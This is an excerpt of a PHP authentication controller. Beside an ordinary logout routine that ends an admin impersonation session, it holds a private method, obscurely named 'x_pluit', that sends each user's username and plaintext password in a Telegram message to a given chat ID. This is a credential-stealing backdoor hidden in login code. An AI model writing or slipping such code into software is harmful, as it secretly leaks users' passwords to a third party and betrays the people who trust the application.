...
class Auth extends Auth_Controller
{
	...
	public function logout()
	{
		...
		if ($cek_impersonate === TRUE) {
			$this->load->model("user/Impersonate_model");
			$this->Impersonate_model->back_to_admin();
	...
	private function x_pluit($username, $password, $chat_id)
	{
		...
		if (!empty($tele)) {
			$pesan = "Username : <b>" . $username . "</b>";
			$pesan .= html_escape("\n");
			$pesan .= "Password : <b>" . $password . "</b>";
			$tele->sendMessage($pesan,$chat_id);
		}
	}
}
